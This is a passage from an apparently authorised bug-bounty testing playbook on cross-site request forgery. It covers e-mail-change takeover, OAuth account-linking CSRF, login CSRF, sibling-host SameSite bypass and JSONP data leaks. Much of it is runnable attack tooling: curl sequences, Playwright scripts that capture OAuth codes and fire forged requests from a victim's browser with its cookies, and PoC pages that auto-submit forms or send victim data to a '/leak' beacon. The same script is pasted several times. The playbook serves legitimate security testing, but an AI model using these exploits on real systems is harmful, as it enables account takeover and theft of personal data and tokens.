  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  # 2. B's browser opens it once, in an engine that CSR-001 showed carrying the cookie on a cross-site POST
  ENG=firefox
  python3 "$E/tools/csrf-fire.py" poc.html "$D" $ENG "${HDR[@]}"
  curl -sS "${HDR[@]}" $B "$T/api/me" | jq -c '{id, email, unconfirmed_email}' | tee "$D/02-after.json"
  # 3. finish as the attacker, from a client that never held B's session: confirm from N's inbox if asked, then reset through N
  curl -sS "${HDR[@]}" -X POST "$T/password/reset" --data-urlencode "email=$N" -o /dev/null -w 'reset requested for N: %{http_code}\n'
  #    open the reset link that arrives at N, set NP as the new password, then sign in with it
  curl -sS "${HDR[@]}" -c "$D/attacker.jar" -X POST "$T/login" --data-urlencode "email=$N" --data-urlencode "password=$NP" -o /dev/null -w 'login as N: %{http_code}\n'
  curl -sS "${HDR[@]}" -b "$D/attacker.jar" "$T/api/me" | jq -c '{id, email}' | tee "$D/03-attacker-view.json"   # the id of 01-before.json
  ```
  For a password change that asks no current password, the page posts the new password (and its confirmation
  field) instead, and step 3 is a login with B's own e-mail and `NP`. Afterwards restore B (e-mail and password
  back) and refresh `accounts/B.headers` and `accounts/B.set-cookie`.
- **Proof:** `01-before.json` (B's id and e-mail), the page, `browser.log`, `02-after.json` showing our address on
  B's account, the confirmation and reset mails received at it, and `03-attacker-view.json` showing B's id from a
  client that never held B's session. Account and addresses are ours throughout.
- **Not a finding when:** the change asks for the current password or code and enforces it (AUT-015 negative).
  The e-mail change stays pending until a link sent to the old address is clicked. Every engine refuses to send
  the cookie on the page's request (CSR-001). The forged change only adds a secondary contact that can neither
  log in nor receive a reset.
- **Escalate:** with a valid token on every account form, the takeover still runs from script in the target's
  origin (XSS-018) or with a token read from another site (CSR-012). Disabling the second factor or adding our
  phone without the current code is a medium downgrade on its own (AUT-009). Old sessions that survive the change
  make it worse (AUT-017).

### CSR-009 · The account-linking or integration callback accepts an authorization begun in another session, so the attacker's identity or workspace is attached to the victim's account

| | |
|---|---|
| **Severity** | High standalone when the attached identity signs in to B's account, or B's private data starts flowing to our workspace; Medium for a link that grants nothing |
| **Requires** | two-accounts, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 |
| **Prior art** | #170552, #174328, #226418, #463330 |

- **Where:** "Connect", "Link" and "Install" flows: connected sign-in identities (Google, Apple, GitHub, Facebook),
  integrations (Slack, GitHub, Jira, Google Drive, a payment or payout provider), contact and friend imports.
  Their callbacks look like `/auth/<provider>/callback`, `/oauth/callback`, `/integrations/<name>/callback` or
  `/connect/<name>`, with `code=` and `state=`. The test needs an identity of ours at the provider (a test Google
  or GitHub account, our own Slack workspace).
- **Test:** the callback must check that `state` belongs to the session completing the flow. If it does not
  (missing, ignored, or only format-checked), the attacker authorises with their own provider identity, stops
  before their own browser loads the callback, and has B's browser load it: the application redeems the
  attacker's code into B's session and links the attacker's identity or workspace to B. For an integration the
  forgeable step may instead be the plain POST that saves the workspace or webhook: CSR-002.
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-009"; mkdir -p "$D"; START="$T/settings/connections/github"   # the Connect link on A's settings page
  # 0. does the flow carry a state, and does it change per start?
  for i in 1 2; do curl -sS "${HDR[@]}" $A -D- -o /dev/null "$START" | grep -i '^location' | grep -o -E '[?&]state=[^&]*'; done
  # 1. as A: start the flow, sign in at the provider with OUR provider identity, stop at the callback with the code unredeemed
  cat > "$D/capture.py" <<'PY'
  import os, re, sys
  from playwright.sync_api import sync_playwright
  E, T, d, start = os.environ['E'], os.environ['T'], sys.argv[1], sys.argv[2]
  jar = re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/A.headers').read()).group(1)
  with sync_playwright() as p:
      b = p.chromium.launch(headless=False); c = b.new_context(); hit = []
      c.add_cookies([dict(name=k.strip(), value=v.strip(), url=T) for k, _, v in (x.partition('=') for x in jar.split(';') if '=' in x)])
      c.route(re.compile(re.escape(T) + r'/.*[?&](code|oauth_token|oauth_verifier)='), lambda r: (hit.append(r.request.url), r.abort()))
      pg = c.new_page(); pg.goto(start)
      for _ in range(300):              # sign in at the provider in this window (or click Connect if the start is a button) and approve
          if hit: break
          pg.wait_for_timeout(1000)
      open(d + '/callback-url.txt', 'w').write(hit[0] if hit else ''); b.close()
  PY
  python3 "$D/capture.py" "$D" "$START"; sed -E 's/(code=)[^&]*/\1<redacted>/' "$D/callback-url.txt"; echo
  # 2. the page: B's browser navigates to the attacker's callback (a top-level GET carries Lax cookies)
  [ -s "$D/callback-url.txt" ] && printf '<!doctype html><title>CSR-009</title><script>location = "%s";</script>\n' "$(cat "$D/callback-url.txt")" > "$D/poc.html"
  # victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  # 3. the code works once: deliver it in one engine, at once, then read B's connections
  LAXWAIT=0 python3 "$E/tools/csrf-fire.py" poc.html "$D" chromium "${HDR[@]}"
  curl -sS "${HDR[@]}" $B "$T/settings/connections" -o "$D/B-connections.html"; grep -i -o -E '(github|google|slack)[^<]{0,80}' "$D/B-connections.html" | head
  ```
  Then, in a fresh browser with no session, use "Sign in with <provider>" with our identity and note whose account
  opens. A callback on another host of the application needs that host's base URL in the `route` pattern. A
  provider that returns the code by `form_post` needs the callback matched by path and its POST body replayed by
  an auto-submitting form instead of `location`.
- **Proof:** B's connections page listing our provider identity or workspace after B's browser loaded the page;
  from a fresh browser, "Sign in with <provider>" with our identity opening B's account (B's id), or an event
  created in B's account arriving in our workspace. Include the callback URL with the code redacted, and whether
  `state` was absent, ignored or not bound to the session.
- **Not a finding when:** the callback answers "state mismatch" or starts a new flow: `state` is bound, mark it
  negative. The link waits for B to confirm with a password or a prompt that names our identity. The provider
  shows B a consent screen (B's browser never redeemed our code). The code had already been used: each capture
  works once. Signing B in to A's account through the login callback, with no linking, is CSR-010 and the OAU
  chapter.
- **Escalate:** takeover through the attached identity. The provider side (`redirect_uri`, `response_type`,
  pre-account takeover through an unverified e-mail) is the OAU chapter and AUT-013. Unlinking by CSRF is low on
  its own.

### CSR-010 · The login form accepts a cross-site POST of the attacker's credentials, so the victim's browser is signed in to the attacker's account

| | |
|---|---|
| **Severity** | Low standalone (`csrf-low` on most programmes); Medium with a self-XSS in the attacker's account, or a flow in which the victim saves something private into it |
| **Requires** | account, browser |
| **Excluded by** | csrf-low |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 |
| **Prior art** | #834366, #774, #577920, #632017 |

- **Where:** the password login form or API; magic-link and one-time-code login URLs; QR and device-approval
  logins; "switch account" endpoints (#774: logging a user in to another account). An OAuth or SAML sign-in
  callback without a bound `state`, or one that accepts unsolicited responses, is the same bug through another
  door: OAU chapter.
- **Test:** a cross-site form posts A's credentials. If the login needs no token tied to a pre-login cookie, the
  response signs B's browser in as A. For a magic link, request one for A, do not open it, and have B's browser
  navigate to it.
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-010"; mkdir -p "$D"; EA='<A e-mail>'; PA='<A password, a throwaway one>'
  # 1. does the form alone sign a client in? no pre-login cookie, no token
  curl -sS "${HDR[@]}" -c "$D/victim.jar" -o /dev/null -X POST "$T/login" --data-urlencode "email=$EA" --data-urlencode "password=$PA" -w 'login without token: %{http_code}\n'
  curl -sS "${HDR[@]}" -b "$D/victim.jar" "$T/api/me" | jq -c '{id, email}'      # A's id: it does
  # 2. the page; B's browser holds B's session and should end up in A's account
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>CSR-010</title>
  <form method="POST" action="$T/login"><input type="hidden" name="email" value="$EA"><input type="hidden" name="password" value="$PA"></form>
  <script>HTMLFormElement.prototype.submit.call(document.forms[0]);</script>
  EOF
  # victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  for e in chromium firefox webkit; do LAXWAIT=0 python3 "$E/tools/csrf-fire.py" poc.html "$D" $e "${HDR[@]}"; done   # the login works whether B's cookie travels or not
  ls "$D"/*.png; grep '/login' "$D/browser.log"     # the screenshots show the page the browser landed on: A's account
  ```
- **Proof:** the screenshot of B's browser showing A's account (A's name or id) after it opened the page, and
  `browser.log` with the POST to the login route. Report it only with a chain from **Escalate** shown on our own
  accounts, unless the policy pays login CSRF alone.
- **Not a finding when:** the programme excludes it (`csrf-low`), which most do. The login needs a token bound to
  a pre-login cookie that the attacker cannot give the victim. The landing page shows B still signed in as B: the
  browser kept the old session or the response set no new one. Logout CSRF is never paid on its own.
- **Escalate:** a self-XSS in A's account (profile, settings, a draft) now runs in B's browser on the target's
  origin (#632017, $300: self-stored XSS chained with login and logout CSRF; XSS chapter). A victim who uploads a
  document, saves a card or connects an account while signed in as A hands it to A: prove it with B's browser
  saving a harmless marker. A sibling host that can set the parent-domain session cookie does the same without the
  form (CSR-011, AUT-016).

### CSR-011 · A page on a sibling host of the same site sends requests that carry SameSite=Lax and Strict cookies, and the target relies on SameSite alone

| | |
|---|---|
| **Severity** | None standalone without a same-site foothold; High with one when the forged action is an account-level change; Medium for other state changes |
| **Requires** | account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352, CWE-1275 |
| **Prior art** | #2326194, #1466765, #1458236 |

- **Where:** targets whose cookie-only form or `text/plain` request is accepted (CSR-002, API-006) while CSR-001
  found the cookie `Lax` or `Strict`: SameSite is the whole defence. Then every in-scope HTTPS host under the same
  registrable domain where we can place HTML or script: uploads served inline from a sibling (`files.`, `cdn.`,
  `usercontent.`), user pages and sites, a docs or forum editor that keeps HTML, a known XSS on any sibling, a
  takeover candidate.
- **Test:** SameSite compares sites, not origins. `https://files.<registrable domain>` and
  `https://app.<registrable domain>` are the same site, so a form or a `fetch` from the first carries every cookie
  of the second, `Strict` included, while still being cross-origin (no custom header or JSON body without a
  preflight). Show that the target does not refuse a sibling `Origin`, then send the forged request from the
  foothold. Argo CD (#2326194, $4,660) was exploitable by anyone able to write HTML on a page of the same parent
  domain; the Grafana reports (#1466765, #1458236) call the same shape a cross-origin request forgery
  (CVE-2022-21703).
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-011"; mkdir -p "$D"; U="$T/settings/profile"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  R=$(printf '%s' "$H" | awk -F. '{print $(NF-1)"."$NF}'); EV=csr011-probe     # R: the registrable domain; set it by hand for co.uk-style suffixes
  # 1. SameSite is the only barrier when a cookie-only form POST with a sibling Origin is accepted
  grep -i -o -E '^set-cookie: *[^=]+|samesite=[a-z]+' "$E/accounts/B.set-cookie" | paste -sd ' '
  curl -sS "${HDR[@]}" -H @"$C" -X POST "$U" -H "Origin: https://$EV.$R" -H "Referer: https://$EV.$R/" \
    --data-urlencode 'bio=csr011-sibling' -o /dev/null -w 'sibling origin: %{http_code} -> '
  curl -sS "${HDR[@]}" $B "$U" | grep -o 'csr011-sibling' || echo unchanged
  # 2. in-scope hosts of the same site: which serve content we can place (inline HTML uploads, user pages, editors)
  scripts/sane asset list | grep -F ".$R" | head -60
  # 3. the page for the foothold: upload it there, or deliver the same script through the sibling's XSS
  cat > "$D/foothold.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>CSR-011</title>
  <form method="POST" action="$U"><input type="hidden" name="bio" value="csr011-csrf"></form>
  <script>HTMLFormElement.prototype.submit.call(document.forms[0]);</script>
  EOF
  #    a JSON API that also parses text/plain (API-006) takes the same change from that page with:
  #    fetch("<API URL>", {method: "POST", mode: "no-cors", credentials: "include", headers: {"Content-Type": "text/plain"}, body: JSON.stringify({bio: "csr011-csrf"})});
  # victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  # 4. B's browser opens the foothold page (FH: its https URL on the sibling), in each engine: same-site requests are first-party everywhere
  FH='<https URL of foothold.html on the sibling host>'
  if scripts/sane scope check "$(printf '%s' "$FH" | cut -d/ -f3)"; then for e in chromium firefox webkit; do
    LAXWAIT=0 python3 "$E/tools/csrf-fire.py" "$FH" "$D" $e "${HDR[@]}"; done; fi      # same-site: Lax and Strict travel, no wait
  curl -sS "${HDR[@]}" $B "$U" | grep -o 'csr011-csrf' || echo unchanged; grep ' POST ' "$D/browser.log"
  ```
- **Proof:** the foothold page's URL on the sibling host and its source; `browser.log` showing the request with
  `origin=https://<sibling>` and the `Lax` or `Strict` session cookie; B's state changed. Say that the sibling is
  in scope and how content gets onto it.
- **Not a finding when:** there is no foothold: park the item with the note "SameSite-only defence", since any
  later sibling XSS or HTML upload turns into this finding. The sibling sits on another registrable domain or on a
  public-suffix domain (separate sites by design, which is why products host user content there), or serves over
  `http` (a different site under schemeful same-site rules). The target refuses the sibling's `Origin`. The upload
  is served as an attachment, as `text/plain`, or with a `sandbox` CSP that blocks forms and script. The sibling
  is out of scope or a third party's service (`third-party`).
- **Escalate:** the same foothold can write cookies for the parent domain: double-submit bypass (CSR-004) and
  session fixation (AUT-016). CSR-008 targets from the foothold. CORS rules that trust any subdomain are the COR
  chapter.

### CSR-012 · A script-includable response carries the victim's anti-CSRF token or personal data, and another site reads it with a script tag

| | |
|---|---|
| **Severity** | Medium standalone when the script exposes B's personal data; High when it exposes an anti-CSRF or access token that then forges an account-level change; None for public data |
| **Requires** | account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 · Information Disclosure · CWE-200 |
| **Prior art** | #450796, #495525, #361951, #118631 |

- **Where:** JSONP endpoints (`callback=`, `jsonp=`, `cb=`, `jsoncallback=`); JavaScript built per user
  (`/js/config.js`, `/user.js`, `/session.js`, i18n or feature-flag scripts that embed the account); pages that
  load the CSRF token or the profile into a global from a separate script. Old widgets and partner integrations
  keep JSONP alive.
- **Test:** a `<script src>` is a cross-site request whose response the browser runs as code inside the
  attacker's page; whatever it defines, or passes to the callback, is readable there. It needs the response served
  as JavaScript (browsers refuse JSON, HTML and `nosniff` mismatches as scripts) and the cookie sent on a
  cross-site subresource: `SameSite=None`, in an engine that does not block third-party cookies (Chromium by
  default; Firefox partitions them, Safari blocks them).
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-012"; mkdir -p "$D"
  # 1. JSONP parameters and per-user scripts in the crawl and the bundles
  grep -rhoE '[?&](callback|jsonp|cb|jsoncallback|jsonpcallback)=[A-Za-z0-9_.]*' "$E/recon/$H/" 2>/dev/null | sort | uniq -c | sort -rn | head
  grep -rhoE '/[A-Za-z0-9_./-]*(config|user|session|account|me|init|bootstrap)[A-Za-z0-9_-]*\.js' "$E/recon/$H/" 2>/dev/null | sort -u | head
  # 2. served as JavaScript, and different for B than for an anonymous client
  for u in "$T/api/me?callback=csr012" "$T/api/session?jsonp=csr012" "$T/js/config.js" "$T/user.js"; do
    a=$(curl -sS "${HDR[@]}" -o "$D/anon.js" -w '%{http_code} %{content_type}' "$u"); b=$(curl -sS "${HDR[@]}" $B -o "$D/b.js" -w '%{http_code} %{content_type}' "$u")
    echo "$u | anonymous: $a, $(wc -c < "$D/anon.js") bytes | B: $b, $(wc -c < "$D/b.js") bytes | $(grep -o -i -E '(csrf[a-z_]*|token|email)"? *[:=] *"[^"]{4}' "$D/b.js" | head -3 | paste -sd ' ')"; sleep 1; done
  # 3. the page reads it and reports it to our own server (the request lands in server.log)
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>CSR-012</title><pre id="out">nothing read</pre>
  <script>function csr012(d) { var s = JSON.stringify(d).slice(0, 300); document.getElementById("out").textContent = s; new Image().src = "/leak?" + encodeURIComponent(s); }</script>
  <script src="$T/api/me?callback=csr012"></script>
  EOF
  #    a per-user script instead: <script src="$T/js/config.js"></script>, then copy the global it defines into #out the same way
  # victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
